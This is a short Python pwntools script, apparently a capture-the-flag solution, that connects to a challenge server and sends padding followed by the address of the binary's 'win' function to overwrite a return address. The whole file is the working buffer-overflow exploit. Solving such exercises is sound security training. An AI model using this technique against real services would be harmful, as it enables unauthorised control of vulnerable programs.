#!/usr/bin/env python3

from pwn import *

e = ELF("./for_player")

HOST = "ret.ch2.btsctf.pl"
PORT = 55125

conn = remote(HOST, PORT)

conn.sendline(asm("nop")*40+p64(e.symbols["win"]))
print(conn.recvall())
